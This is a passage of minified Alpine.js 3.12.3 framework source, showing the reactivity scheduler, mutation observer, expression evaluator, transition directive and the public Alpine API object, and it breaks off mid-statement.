( () => {
    var Xe = !1
      , Ze = !1
      , V = []
      , Qe = -1;
    function Kt(e) {
        !function En(e) {
            V.includes(e) || V.push(e),
            function Sn() {
                !Ze && !Xe && (Xe = !0,
                queueMicrotask(An))
            }()
        }(e)
    }
    function ye(e) {
        let t = V.indexOf(e);
        -1 !== t && t > Qe && V.splice(t, 1)
    }
    function An() {
        Xe = !1,
        Ze = !0;
        for (let e = 0; e < V.length; e++)
            V[e](),
            Qe = e;
        V.length = 0,
        Qe = -1,
        Ze = !1
    }
    var C, D, $, et, tt = !0;
    function rt(e) {
        D = e
    }
    var qt = []
      , Ut = []
      , Wt = [];
    function be(e, t) {
        "function" == typeof t ? (e._x_cleanups || (e._x_cleanups = []),
        e._x_cleanups.push(t)) : (t = e,
        Ut.push(t))
    }
    function nt(e, t) {
        !e._x_attributeCleanups || Object.entries(e._x_attributeCleanups).forEach(( ([r,n]) => {
            (void 0 === t || t.includes(r)) && (n.forEach((i => i())),
            delete e._x_attributeCleanups[r])
        }
        ))
    }
    var ot = new MutationObserver(it)
      , st = !1;
    function se() {
        ot.observe(document, {
            subtree: !0,
            childList: !0,
            attributes: !0,
            attributeOldValue: !0
        }),
        st = !0
    }
    function at() {
        (function On() {
            (ae = ae.concat(ot.takeRecords())).length && !ct && (ct = !0,
            queueMicrotask(( () => {
                (function Tn() {
                    it(ae),
                    ae.length = 0
                }
                )(),
                ct = !1
            }
            )))
        }
        )(),
        ot.disconnect(),
        st = !1
    }
    var ae = []
      , ct = !1;
    function h(e) {
        if (!st)
            return e();
        at();
        let t = e();
        return se(),
        t
    }
    var lt = !1
      , ve = [];
    function it(e) {
        if (lt)
            return void (ve = ve.concat(e));
        let t = []
          , r = []
          , n = new Map
          , i = new Map;
        for (let o = 0; o < e.length; o++)
            if (!e[o].target._x_ignoreMutationObserver && ("childList" === e[o].type && (e[o].addedNodes.forEach((s => 1 === s.nodeType && t.push(s))),
            e[o].removedNodes.forEach((s => 1 === s.nodeType && r.push(s)))),
            "attributes" === e[o].type)) {
                let s = e[o].target
                  , a = e[o].attributeName
                  , c = e[o].oldValue
                  , l = () => {
                    n.has(s) || n.set(s, []),
                    n.get(s).push({
                        name: a,
                        value: s.getAttribute(a)
                    })
                }
                  , u = () => {
                    i.has(s) || i.set(s, []),
                    i.get(s).push(a)
                }
                ;
                s.hasAttribute(a) && null === c ? l() : s.hasAttribute(a) ? (u(),
                l()) : u()
            }
        i.forEach(( (o, s) => {
            nt(s, o)
        }
        )),
        n.forEach(( (o, s) => {
            qt.forEach((a => a(s, o)))
        }
        ));
        for (let o of r)
            if (!t.includes(o) && (Ut.forEach((s => s(o))),
            o._x_cleanups))
                for (; o._x_cleanups.length; )
                    o._x_cleanups.pop()();
        t.forEach((o => {
            o._x_ignoreSelf = !0,
            o._x_ignore = !0
        }
        ));
        for (let o of t)
            r.includes(o) || !o.isConnected || (delete o._x_ignoreSelf,
            delete o._x_ignore,
            Wt.forEach((s => s(o))),
            o._x_ignore = !0,
            o._x_ignoreSelf = !0);
        t.forEach((o => {
            delete o._x_ignoreSelf,
            delete o._x_ignore
        }
        )),
        t = null,
        r = null,
        n = null,
        i = null
    }
    function we(e) {
        return F(L(e))
    }
    function N(e, t, r) {
        return e._x_dataStack = [t, ...L(r || e)],
        () => {
            e._x_dataStack = e._x_dataStack.filter((n => n !== t))
        }
    }
    function L(e) {
        return e._x_dataStack ? e._x_dataStack : "function" == typeof ShadowRoot && e instanceof ShadowRoot ? L(e.host) : e.parentNode ? L(e.parentNode) : []
    }
    function F(e) {
        let t = new Proxy({},{
            ownKeys: () => Array.from(new Set(e.flatMap((r => Object.keys(r))))),
            has: (r, n) => e.some((i => i.hasOwnProperty(n))),
            get: (r, n) => (e.find((i => {
                if (i.hasOwnProperty(n)) {
                    let o = Object.getOwnPropertyDescriptor(i, n);
                    if (o.get && o.get._x_alreadyBound || o.set && o.set._x_alreadyBound)
                        return !0;
                    if ((o.get || o.set) && o.enumerable) {
                        let s = o.get
                          , a = o.set
                          , c = o;
                        s = s && s.bind(t),
                        a = a && a.bind(t),
                        s && (s._x_alreadyBound = !0),
                        a && (a._x_alreadyBound = !0),
                        Object.defineProperty(i, n, {
                            ...c,
                            get: s,
                            set: a
                        })
                    }
                    return !0
                }
                return !1
            }
            )) || {})[n],
            set: (r, n, i) => {
                let o = e.find((s => s.hasOwnProperty(n)));
                return o ? o[n] = i : e[e.length - 1][n] = i,
                !0
            }
        });
        return t
    }
    function Ee(e) {
        let r = (n, i="") => {
            Object.entries(Object.getOwnPropertyDescriptors(n)).forEach(( ([o,{value: s, enumerable: a}]) => {
                if (!1 === a || void 0 === s)
                    return;
                let c = "" === i ? o : `${i}.${o}`;
                "object" == typeof s && null !== s && s._x_interceptor ? n[o] = s.initialize(e, c, o) : (n => "object" == typeof n && !Array.isArray(n) && null !== n)(s) && s !== n && !(s instanceof Element) && r(s, c)
            }
            ))
        }
        ;
        return r(e)
    }
    function Se(e, t=( () => {}
    )) {
        let r = {
            initialValue: void 0,
            _x_interceptor: !0,
            initialize(n, i, o) {
                return e(this.initialValue, ( () => function Cn(e, t) {
                    return t.split(".").reduce(( (r, n) => r[n]), e)
                }(n, i)), (s => ut(n, i, s)), i, o)
            }
        };
        return t(r),
        n => {
            if ("object" == typeof n && null !== n && n._x_interceptor) {
                let i = r.initialize.bind(r);
                r.initialize = (o, s, a) => {
                    let c = n.initialize(o, s, a);
                    return r.initialValue = c,
                    i(o, s, a)
                }
            } else
                r.initialValue = n;
            return r
        }
    }
    function ut(e, t, r) {
        if ("string" == typeof t && (t = t.split(".")),
        1 !== t.length) {
            if (0 === t.length)
                throw error;
            return e[t[0]] || (e[t[0]] = {}),
            ut(e[t[0]], t.slice(1), r)
        }
        e[t[0]] = r
    }
    var Qt = {};
    function y(e, t) {
        Qt[e] = t
    }
    function ce(e, t) {
        return Object.entries(Qt).forEach(( ([r,n]) => {
            let i = null;
            Object.defineProperty(e, `$${r}`, {
                get: () => n(t, function o() {
                    if (i)
                        return i;
                    {
                        let[s,a] = ft(t);
                        return i = {
                            interceptor: Se,
                            ...s
                        },
                        be(t, a),
                        i
                    }
                }()),
                enumerable: !1
            })
        }
        )),
        e
    }
    function er(e, t, r, ...n) {
        try {
            return r(...n)
        } catch (i) {
            X(i, e, t)
        }
    }
    function X(e, t, r=void 0) {
        Object.assign(e, {
            el: t,
            expression: r
        }),
        console.warn(`Alpine Expression Error: ${e.message}\n\n${r ? 'Expression: "' + r + '"\n\n' : ""}`, t),
        setTimeout(( () => {
            throw e
        }
        ), 0)
    }
    var Ae = !0;
    function Oe(e) {
        let t = Ae;
        Ae = !1;
        let r = e();
        return Ae = t,
        r
    }
    function R(e, t, r={}) {
        let n;
        return x(e, t)((i => n = i), r),
        n
    }
    function x(...e) {
        return tr(...e)
    }
    var tr = dt;
    function dt(e, t) {
        let r = {};
        ce(r, e);
        let n = [r, ...L(e)]
          , i = "function" == typeof t ? function Rn(e, t) {
            return (r=( () => {}
            ), {scope: n={}, params: i=[]}={}) => {
                Te(r, t.apply(F([n, ...e]), i))
            }
        }(n, t) : function Mn(e, t, r) {
            let n = function Nn(e, t) {
                if (pt[e])
                    return pt[e];
                let r = Object.getPrototypeOf((async function() {}
                )).constructor
                  , n = /^[\n\s]*if.*\(.*\)/.test(e) || /^(let|const)\s/.test(e) ? `(async()=>{ ${e} })()` : e
                  , o = ( () => {
                    try {
                        return new r(["__self", "scope"],`with (scope) { __self.result = ${n} }; __self.finished = true; return __self.result;`)
                    } catch (s) {
                        return X(s, t, e),
                        Promise.resolve()
                    }
                }
                )();
                return pt[e] = o,
                o
            }(t, r);
            return (i=( () => {}
            ), {scope: o={}, params: s=[]}={}) => {
                n.result = void 0,
                n.finished = !1;
                let a = F([o, ...e]);
                if ("function" == typeof n) {
                    let c = n(n, a).catch((l => X(l, r, t)));
                    n.finished ? (Te(i, n.result, a, s, r),
                    n.result = void 0) : c.then((l => {
                        Te(i, l, a, s, r)
                    }
                    )).catch((l => X(l, r, t))).finally(( () => n.result = void 0))
                }
            }
        }(n, t, e);
        return er.bind(null, e, t, i)
    }
    var pt = {};
    function Te(e, t, r, n, i) {
        if (Ae && "function" == typeof t) {
            let o = t.apply(r, n);
            o instanceof Promise ? o.then((s => Te(e, s, r, n))).catch((s => X(s, i, t))) : e(o)
        } else
            "object" == typeof t && t instanceof Promise ? t.then((o => e(o))) : e(t)
    }
    var mt = "x-";
    function O(e="") {
        return mt + e
    }
    var ht = {};
    function p(e, t) {
        return ht[e] = t,
        {
            before(r) {
                if (!ht[r])
                    return void console.warn("Cannot find directive `${directive}`. `${name}` will use the default order of execution");
                let n = H.indexOf(r);
                H.splice(n >= 0 ? n : H.indexOf("DEFAULT"), 0, e)
            }
        }
    }
    function le(e, t, r) {
        if (t = Array.from(t),
        e._x_virtualDirectives) {
            let o = Object.entries(e._x_virtualDirectives).map(( ([a,c]) => ({
                name: a,
                value: c
            })))
              , s = _t(o);
            o = o.map((a => s.find((c => c.name === a.name)) ? {
                name: `x-bind:${a.name}`,
                value: `"${a.value}"`
            } : a)),
            t = t.concat(o)
        }
        let n = {};
        return t.map(ir(( (o, s) => n[o] = s))).filter(or).map(function In(e, t) {
            return ({name: r, value: n}) => {
                let i = r.match(lr())
                  , o = r.match(/:([a-zA-Z0-9\-:]+)/)
                  , s = r.match(/\.[^.\]]+(?=[^\]]*$)/g) || []
                  , a = t || e[r] || r;
                return {
                    type: i ? i[1] : null,
                    value: o ? o[1] : null,
                    modifiers: s.map((c => c.replace(".", ""))),
                    expression: n,
                    original: a
                }
            }
        }(n, r)).sort(Dn).map((o => function Pn(e, t) {
            let r = () => {}
              , n = ht[t.type] || r
              , [i,o] = ft(e);
            !function Yt(e, t, r) {
                e._x_attributeCleanups || (e._x_attributeCleanups = {}),
                e._x_attributeCleanups[t] || (e._x_attributeCleanups[t] = []),
                e._x_attributeCleanups[t].push(r)
            }(e, t.original, o);
            let s = () => {
                e._x_ignore || e._x_ignoreSelf || (n.inline && n.inline(e, t, i),
                n = n.bind(n, e, t, i),
                gt ? ue.get(sr).push(n) : n())
            }
            ;
            return s.runCleanups = o,
            s
        }(e, o)))
    }
    function _t(e) {
        return Array.from(e).map(ir()).filter((t => !or(t)))
    }
    var gt = !1
      , ue = new Map
      , sr = Symbol();
    function ft(e) {
        let t = []
          , [n,i] = function Ht(e) {
            let t = () => {}
            ;
            return [n => {
                let i = D(n);
                return e._x_effects || (e._x_effects = new Set,
                e._x_runEffects = () => {
                    e._x_effects.forEach((o => o()))
                }
                ),
                e._x_effects.add(i),
                t = () => {
                    void 0 !== i && (e._x_effects.delete(i),
                    $(i))
                }
                ,
                i
            }
            , () => {
                t()
            }
            ]
        }(e);
        return t.push(i),
        [{
            Alpine: j,
            effect: n,
            cleanup: a => t.push(a),
            evaluateLater: x.bind(x, e),
            evaluate: R.bind(R, e)
        }, () => t.forEach((a => a()))]
    }
    var Ce = (e, t) => ({name: r, value: n}) => (r.startsWith(e) && (r = r.replace(e, t)),
    {
        name: r,
        value: n
    });
    function ir(e=( () => {}
    )) {
        return ({name: t, value: r}) => {
            let {name: n, value: i} = cr.reduce(( (o, s) => s(o)), {
                name: t,
                value: r
            });
            return n !== t && e(n, t),
            {
                name: n,
                value: i
            }
        }
    }
    var cr = [];
    function Z(e) {
        cr.push(e)
    }
    function or({name: e}) {
        return lr().test(e)
    }
    var lr = () => new RegExp(`^${mt}([^:^.]+)\\b`);
    var xt = "DEFAULT"
      , H = ["ignore", "ref", "data", "id", "bind", "init", "for", "model", "modelable", "transition", "show", "if", xt, "teleport"];
    function Dn(e, t) {
        let r = -1 === H.indexOf(e.type) ? xt : e.type
          , n = -1 === H.indexOf(t.type) ? xt : t.type;
        return H.indexOf(r) - H.indexOf(n)
    }
    function q(e, t, r={}) {
        e.dispatchEvent(new CustomEvent(t,{
            detail: r,
            bubbles: !0,
            composed: !0,
            cancelable: !0
        }))
    }
    function T(e, t) {
        if ("function" == typeof ShadowRoot && e instanceof ShadowRoot)
            return void Array.from(e.children).forEach((i => T(i, t)));
        let r = !1;
        if (t(e, ( () => r = !0)),
        r)
            return;
        let n = e.firstElementChild;
        for (; n; )
            T(n, t),
            n = n.nextElementSibling
    }
    function S(e, ...t) {
        console.warn(`Alpine Warning: ${e}`, ...t)
    }
    var ur = !1;
    var bt = []
      , pr = [];
    function mr() {
        return bt.map((e => e()))
    }
    function fr() {
        return bt.concat(pr).map((e => e()))
    }
    function Me(e) {
        bt.push(e)
    }
    function Ne(e) {
        pr.push(e)
    }
    function U(e, t=!1) {
        return Q(e, (r => {
            if ((t ? fr() : mr()).some((i => r.matches(i))))
                return !0
        }
        ))
    }
    function Q(e, t) {
        if (e) {
            if (t(e))
                return e;
            if (e._x_teleportBack && (e = e._x_teleportBack),
            e.parentElement)
                return Q(e.parentElement, t)
        }
    }
    var _r = [];
    function E(e, t=T, r=( () => {}
    )) {
        !function ar(e) {
            gt = !0;
            let t = Symbol();
            sr = t,
            ue.set(t, []);
            let r = () => {
                for (; ue.get(t).length; )
                    ue.get(t).shift()();
                ue.delete(t)
            }
            ;
            e(r),
            gt = !1,
            r()
        }(( () => {
            t(e, ( (n, i) => {
                r(n, i),
                _r.forEach((o => o(n, i))),
                le(n, n.attributes).forEach((o => o())),
                n._x_ignore && i()
            }
            ))
        }
        ))
    }
    function yt(e) {
        T(e, (t => nt(t)))
    }
    var vt = []
      , wt = !1;
    function ee(e=( () => {}
    )) {
        return queueMicrotask(( () => {
            wt || setTimeout(( () => {
                Pe()
            }
            ))
        }
        )),
        new Promise((t => {
            vt.push(( () => {
                e(),
                t()
            }
            ))
        }
        ))
    }
    function Pe() {
        for (wt = !1; vt.length; )
            vt.shift()()
    }
    function fe(e, t) {
        return Array.isArray(t) ? yr(e, t.join(" ")) : "object" == typeof t && null !== t ? function kn(e, t) {
            let r = a => a.split(" ").filter(Boolean)
              , n = Object.entries(t).flatMap(( ([a,c]) => !!c && r(a))).filter(Boolean)
              , i = Object.entries(t).flatMap(( ([a,c]) => !c && r(a))).filter(Boolean)
              , o = []
              , s = [];
            return i.forEach((a => {
                e.classList.contains(a) && (e.classList.remove(a),
                s.push(a))
            }
            )),
            n.forEach((a => {
                e.classList.contains(a) || (e.classList.add(a),
                o.push(a))
            }
            )),
            () => {
                s.forEach((a => e.classList.add(a))),
                o.forEach((a => e.classList.remove(a)))
            }
        }(e, t) : "function" == typeof t ? fe(e, t()) : yr(e, t)
    }
    function yr(e, t) {
        return t = !0 === t ? t = "" : t || "",
        (o => (e.classList.add(...o),
        () => {
            e.classList.remove(...o)
        }
        ))(t.split(" ").filter((s => !e.classList.contains(s))).filter(Boolean))
    }
    function W(e, t) {
        return "object" == typeof t && null !== t ? function $n(e, t) {
            let r = {};
            return Object.entries(t).forEach(( ([n,i]) => {
                r[n] = e.style[n],
                n.startsWith("--") || (n = function Fn(e) {
                    return e.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase()
                }(n)),
                e.style.setProperty(n, i)
            }
            )),
            setTimeout(( () => {
                0 === e.style.length && e.removeAttribute("style")
            }
            )),
            () => {
                W(e, r)
            }
        }(e, t) : function Ln(e, t) {
            let r = e.getAttribute("style", t);
            return e.setAttribute("style", t),
            () => {
                e.setAttribute("style", r || "")
            }
        }(e, t)
    }
    function de(e, t=( () => {}
    )) {
        let r = !1;
        return function() {
            r ? t.apply(this, arguments) : (r = !0,
            e.apply(this, arguments))
        }
    }
    function br(e, t, r={}) {
        e._x_transition || (e._x_transition = {
            enter: {
                during: r,
                start: r,
                end: r
            },
            leave: {
                during: r,
                start: r,
                end: r
            },
            in(n=( () => {}
            ), i=( () => {}
            )) {
                Ie(e, t, {
                    during: this.enter.during,
                    start: this.enter.start,
                    end: this.enter.end
                }, n, i)
            },
            out(n=( () => {}
            ), i=( () => {}
            )) {
                Ie(e, t, {
                    during: this.leave.during,
                    start: this.leave.start,
                    end: this.leave.end
                }, n, i)
            }
        })
    }
    function vr(e) {
        let t = e.parentNode;
        if (t)
            return t._x_hidePromise ? t : vr(t)
    }
    function Ie(e, t, {during: r, start: n, end: i}={}, o=( () => {}
    ), s=( () => {}
    )) {
        if (e._x_transitioning && e._x_transitioning.cancel(),
        0 === Object.keys(r).length && 0 === Object.keys(n).length && 0 === Object.keys(i).length)
            return o(),
            void s();
        let a, c, l;
        !function Kn(e, t) {
            let r, n, i, o = de(( () => {
                h(( () => {
                    r = !0,
                    n || t.before(),
                    i || (t.end(),
                    Pe()),
                    t.after(),
                    e.isConnected && t.cleanup(),
                    delete e._x_transitioning
                }
                ))
            }
            ));
            e._x_transitioning = {
                beforeCancels: [],
                beforeCancel(s) {
                    this.beforeCancels.push(s)
                },
                cancel: de((function() {
                    for (; this.beforeCancels.length; )
                        this.beforeCancels.shift()();
                    o()
                }
                )),
                finish: o
            },
            h(( () => {
                t.start(),
                t.during()
            }
            )),
            function xr() {
                wt = !0
            }(),
            requestAnimationFrame(( () => {
                if (r)
                    return;
                let s = 1e3 * Number(getComputedStyle(e).transitionDuration.replace(/,.*/, "").replace("s", ""))
                  , a = 1e3 * Number(getComputedStyle(e).transitionDelay.replace(/,.*/, "").replace("s", ""));
                0 === s && (s = 1e3 * Number(getComputedStyle(e).animationDuration.replace("s", ""))),
                h(( () => {
                    t.before()
                }
                )),
                n = !0,
                requestAnimationFrame(( () => {
                    r || (h(( () => {
                        t.end()
                    }
                    )),
                    Pe(),
                    setTimeout(e._x_transitioning.finish, s + a),
                    i = !0)
                }
                ))
            }
            ))
        }(e, {
            start() {
                a = t(e, n)
            },
            during() {
                c = t(e, r)
            },
            before: o,
            end() {
                a(),
                l = t(e, i)
            },
            after: s,
            cleanup() {
                c(),
                l()
            }
        })
    }
    function pe(e, t, r) {
        if (-1 === e.indexOf(t))
            return r;
        let n = e[e.indexOf(t) + 1];
        if (!n || "scale" === t && isNaN(n))
            return r;
        if ("duration" === t || "delay" === t) {
            let i = n.match(/([0-9]+)ms/);
            if (i)
                return i[1]
        }
        return "origin" === t && ["top", "right", "left", "center", "bottom"].includes(e[e.indexOf(t) + 2]) ? [n, e[e.indexOf(t) + 2]].join(" ") : n
    }
    p("transition", ( (e, {value: t, modifiers: r, expression: n}, {evaluate: i}) => {
        "function" == typeof n && (n = i(n)),
        !1 !== n && (n && "boolean" != typeof n ? function jn(e, t, r) {
            br(e, fe, ""),
            {
                enter: i => {
                    e._x_transition.enter.during = i
                }
                ,
                "enter-start": i => {
                    e._x_transition.enter.start = i
                }
                ,
                "enter-end": i => {
                    e._x_transition.enter.end = i
                }
                ,
                leave: i => {
                    e._x_transition.leave.during = i
                }
                ,
                "leave-start": i => {
                    e._x_transition.leave.start = i
                }
                ,
                "leave-end": i => {
                    e._x_transition.leave.end = i
                }
            }[r](t)
        }(e, n, t) : function Bn(e, t, r) {
            br(e, W);
            let n = !t.includes("in") && !t.includes("out") && !r
              , i = n || t.includes("in") || ["enter"].includes(r)
              , o = n || t.includes("out") || ["leave"].includes(r);
            t.includes("in") && !n && (t = t.filter(( (_, b) => b < t.indexOf("out")))),
            t.includes("out") && !n && (t = t.filter(( (_, b) => b > t.indexOf("out"))));
            let s = !t.includes("opacity") && !t.includes("scale")
              , a = s || t.includes("opacity")
              , c = s || t.includes("scale")
              , l = a ? 0 : 1
              , u = c ? pe(t, "scale", 95) / 100 : 1
              , d = pe(t, "delay", 0) / 1e3
              , m = pe(t, "origin", "center")
              , v = "opacity, transform"
              , k = pe(t, "duration", 150) / 1e3
              , xe = pe(t, "duration", 75) / 1e3
              , f = "cubic-bezier(0.4, 0.0, 0.2, 1)";
            i && (e._x_transition.enter.during = {
                transformOrigin: m,
                transitionDelay: `${d}s`,
                transitionProperty: v,
                transitionDuration: `${k}s`,
                transitionTimingFunction: f
            },
            e._x_transition.enter.start = {
                opacity: l,
                transform: `scale(${u})`
            },
            e._x_transition.enter.end = {
                opacity: 1,
                transform: "scale(1)"
            }),
            o && (e._x_transition.leave.during = {
                transformOrigin: m,
                transitionDelay: `${d}s`,
                transitionProperty: v,
                transitionDuration: `${xe}s`,
                transitionTimingFunction: f
            },
            e._x_transition.leave.start = {
                opacity: 1,
                transform: "scale(1)"
            },
            e._x_transition.leave.end = {
                opacity: l,
                transform: `scale(${u})`
            })
        }(e, r, t))
    }
    )),
    window.Element.prototype._x_toggleAndCascadeWithTransitions = function(e, t, r, n) {
        let i = "visible" === document.visibilityState ? requestAnimationFrame : setTimeout
          , o = () => i(r);
        t ? e._x_transition && (e._x_transition.enter || e._x_transition.leave) ? e._x_transition.enter && (Object.entries(e._x_transition.enter.during).length || Object.entries(e._x_transition.enter.start).length || Object.entries(e._x_transition.enter.end).length) ? e._x_transition.in(r) : o() : e._x_transition ? e._x_transition.in(r) : o() : (e._x_hidePromise = e._x_transition ? new Promise(( (s, a) => {
            e._x_transition.out(( () => {}
            ), ( () => s(n))),
            e._x_transitioning.beforeCancel(( () => a({
                isFromCancelledTransition: !0
            })))
        }
        )) : Promise.resolve(n),
        queueMicrotask(( () => {
            let s = vr(e);
            s ? (s._x_hideChildren || (s._x_hideChildren = []),
            s._x_hideChildren.push(e)) : i(( () => {
                let a = c => {
                    let l = Promise.all([c._x_hidePromise, ...(c._x_hideChildren || []).map(a)]).then(( ([u]) => u()));
                    return delete c._x_hidePromise,
                    delete c._x_hideChildren,
                    l
                }
                ;
                a(e).catch((c => {
                    if (!c.isFromCancelledTransition)
                        throw c
                }
                ))
            }
            ))
        }
        )))
    }
    ;
    var te = !1;
    function P(e, t=( () => {}
    )) {
        return (...r) => te ? t(...r) : e(...r)
    }
    function me(e, t, r, n=[]) {
        switch (e._x_bindings || (e._x_bindings = C({})),
        e._x_bindings[t] = r,
        t = n.includes("camel") ? function Gn(e) {
            return e.toLowerCase().replace(/-(\w)/g, ( (t, r) => r.toUpperCase()))
        }(t) : t,
        t) {
        case "value":
            !function Hn(e, t) {
                if ("radio" === e.type)
                    void 0 === e.attributes.value && (e.value = t),
                    window.fromModel && (e.checked = Ar(e.value, t));
                else if ("checkbox" === e.type)
                    Number.isInteger(t) ? e.value = t : Number.isInteger(t) || Array.isArray(t) || "boolean" == typeof t || [null, void 0].includes(t) ? Array.isArray(t) ? e.checked = t.some((r => Ar(r, e.value))) : e.checked = !!t : e.value = String(t);
                else if ("SELECT" === e.tagName)
                    !function Jn(e, t) {
                        let r = [].concat(t).map((n => n + ""));
                        Array.from(e.options).forEach((n => {
                            n.selected = r.includes(n.value)
                        }
                        ))
                    }(e, t);
                else {
                    if (e.value === t)
                        return;
                    e.value = t
                }
            }(e, r);
            break;
        case "style":
            !function Un(e, t) {
                e._x_undoAddedStyles && e._x_undoAddedStyles(),
                e._x_undoAddedStyles = W(e, t)
            }(e, r);
            break;
        case "class":
            !function qn(e, t) {
                e._x_undoAddedClasses && e._x_undoAddedClasses(),
                e._x_undoAddedClasses = fe(e, t)
            }(e, r);
            break;
        case "selected":
        case "checked":
            !function Wn(e, t, r) {
                Sr(e, t, r),
                function Yn(e, t, r) {
                    e[t] !== r && (e[t] = r)
                }(e, t, r)
            }(e, t, r);
            break;
        default:
            Sr(e, t, r)
        }
    }
    function Sr(e, t, r) {
        [null, void 0, !1].includes(r) && function Zn(e) {
            return !["aria-pressed", "aria-checked", "aria-expanded", "aria-selected"].includes(e)
        }(t) ? e.removeAttribute(t) : (Or(t) && (r = t),
        function Xn(e, t, r) {
            e.getAttribute(t) != r && e.setAttribute(t, r)
        }(e, t, r))
    }
    function Ar(e, t) {
        return e == t
    }
    function Or(e) {
        return ["disabled", "checked", "required", "readonly", "hidden", "open", "selected", "autofocus", "itemscope", "multiple", "novalidate", "allowfullscreen", "allowpaymentrequest", "formnovalidate", "autoplay", "controls", "loop", "muted", "playsinline", "default", "ismap", "reversed", "async", "defer", "nomodule"].includes(e)
    }
    function Tr(e, t, r) {
        let n = e.getAttribute(t);
        return null === n ? "function" == typeof r ? r() : r : "" === n || (Or(t) ? !![t, "true"].includes(n) : n)
    }
    function De(e, t) {
        var r;
        return function() {
            var n = this
              , i = arguments;
            clearTimeout(r),
            r = setTimeout((function() {
                r = null,
                e.apply(n, i)
            }
            ), t)
        }
    }
    function ke(e, t) {
        let r;
        return function() {
            let i = arguments;
            r || (e.apply(this, i),
            r = !0,
            setTimeout(( () => r = !1), t))
        }
    }
    var G = {}
      , Nr = !1;
    var Dr = {};
    function Et(e, t, r) {
        let n = [];
        for (; n.length; )
            n.pop()();
        let i = Object.entries(t).map(( ([s,a]) => ({
            name: s,
            value: a
        })))
          , o = _t(i);
        i = i.map((s => o.find((a => a.name === s.name)) ? {
            name: `x-bind:${s.name}`,
            value: `"${s.value}"`
        } : s)),
        le(e, i, r).map((s => {
            n.push(s.runCleanups),
            s()
        }
        ))
    }
    var Lr = {};
    var j = {
        get reactive() {
            return C
        },
        get release() {
            return $
        },
        get effect() {
            return D
        },
        get raw() {
            return et
        },
        version: "3.12.3",
        flushAndStopDeferringMutations: function Zt() {
            lt = !1,
            it(ve),
            ve = []
        },
        dontAutoEvaluateFunctions: Oe,
        disableEffectScheduling: function zt(e) {
            tt = !1,
            e(),
            tt = !0
        },
        startObservingMutations: se,
        stopObservingMutations: at,
        setReactivityEngine: function Vt(e) {
            C = e.reactive,
            $ = e.release,
            D = t => e.effect(t, {
                scheduler: r => {
                    tt ? Kt(r) : r()
                }
            }),
            et = e.raw
        },
        closestDataStack: L,
        skipDuringClone: P,
        onlyDuringClone: function wr(e) {
            return (...t) => te && e(...t)
        },
        addRootSelector: Me,
        addInitSelector: Ne,
        addScopeToNode: N,
        deferMutations: function Xt() {
            lt = !0
        },
        mapAttributes: Z,
        evaluateLater: x,
        interceptInit: function gr(e) {
            _r.push(e)
        },
        setEvaluator: function rr(e) {
            tr = e
        },
        mergeProxies: F,
        extractProp: function Rr(e, t, r, n=!0) {
            if (e._x_bindings && void 0 !== e._x_bindings[t])
                return e._x_bindings[t];
            if (e._x_inlineBindings && void 0 !== e._x_inlineBindings[t]) {
                let i = e._x_inlineBindings[t];
                return i.extract = n,
                Oe(( () => R(e, i.expression)))
            }
            return Tr(e, t, r)
        },
        findClosest: Q,
        closestRoot: U,
        destroyTree: yt,
        interceptor: Se,
        transition: Ie,
        setStyles: W,
        mutateDom: h,
        directive: p,
        throttle: ke,
        debounce: De,
        evaluate: R,
        initTree: E,
        nextTick: ee,
        prefixed: O,
        prefix: function nr(e) {
            mt = e
        },
        plugin: function Mr(e) {
            (Array.isArray(e) ? e : [e]).forEach((r => r(j)))
        },
        magic: y,
        store: function Pr(e, t) {
            if (Nr || (G = C(G),
            Nr = !0),
            void 0 === t)
                return G[e];
            G[e] = t,
            "object" == typeof t && null !== t && t.hasOwnProperty("init") && "function" == typeof t.init && G[e].init(),
            Ee(G[e])
        },
        start: function dr() {
            ur && S("Alpine has already been initialized on this page. Calling Alpine.start() more than once can cause problems."),
            ur = !0,
            document.body || S("Unable to initialize. Trying to load Alpine before `<body>` is available. Did you forget to add `defer` in Alpine's `<script>` tag?"),
            q(document, "alpine:init"),
            q(document, "alpine:initializing"),
            se(),
            function Gt(e) {
                Wt.push(e)
            }((t => E(t, T))),
            be((t => yt(t))),
            function Jt(e) {
                qt.push(e)
            }(( (t, r) => {
                le(t, r).forEach((n => n()))
            }
            )),
            Array.from(document.querySelectorAll(fr())).filter((t => !U(t.parentElement, !0))).forEach((t => {
                E(t)
            }
            )),
            q(document, "alpine:initialized")
        },
        clone: function Er(e, t) {
            t._x_dataStack || (t._x_dataStack = e._x_dataStack),
            te = !0,
            function Vn(e) {
                let t = D;
                rt(( (r, n) => {
                    let i = t(r);
                    return $(i),
                    () => {}
                }
                )),
                e(),
                rt(t)
            }(( () => {
                !function zn(e) {
                    let t = !1;
                    E(e, ( (n, i) => {
                        T(n, ( (o, s) => {
                            if (t && function hr(e) {
                                return mr().some((t => e.matches(t)))
                            }(o))
                                return s();
                            t = !0,
                            i(o, s)
                        }
                        ))
                    }
                    ))
                }(t)
            }
            )),
            te = !1
        },
        bound: function Cr(e, t, r) {
            return e._x_bindings && void 0 !== e._x_bindings[t] ? e._x_bindings[t] : Tr(e, t, r)
        },
        $data: we,
        walk: T,
        data: function Fr(e, t) {
            Lr[e] = t
        },
        bind: function kr(e, t) {
            let r = "function" != typeof t ? () => t : t;
            e instanceof Element ? Et(e, r()) : Dr[e] = r
        }
    };
    function St(e, t) {
        let r = Object.create(null)
          , n = e.split(",");
        for (let i = 0; i < n.length; i++)
            r[n[i]] = !0;
        return t ? i => !!r[i.toLowerCase()] : i => !!r[i]
    }
    St("itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly,async,autofocus,autoplay,controls,default,defer,disabled,hidden,loop,open,required,reversed,scoped,seamless,checked,muted,multiple,selected");
    var I, Br = Object.freeze({}), At = (Object.freeze([]),
    Object.assign), ti = Object.prototype.hasOwnProperty, he = (e, t) => ti.call(e, t), B = Array.isArray, re = e => "[object Map]" === Kr(e), $e = e => "symbol" == typeof e, _e = e => null !== e && "object" == typeof e, ni = Object.prototype.toString, Kr = e => ni.call(e), Ot = e => Kr(e).slice(8, -1), Le = e => (e => "string" == typeof e)(e) && "NaN" !== e && "-" !== e[0] && "" + parseInt(e, 10) === e, Fe = e => {
        let t = Object.create(null);
        return r => t[r] || (t[r] = e(r))
    }
    , ii = /-(\w)/g, oi = (Fe((e => e.replace(ii, ( (t, r) => r ? r.toUpperCase() : "")))),
    /\B([A-Z])/g), Tt = (Fe((e => e.replace(oi, "-$1").toLowerCase())),
    Fe((e => e.charAt(0).toUpperCase() + e.slice(1)))), Ct = (Fe((e => e ? `on${Tt(e)}` : "")),
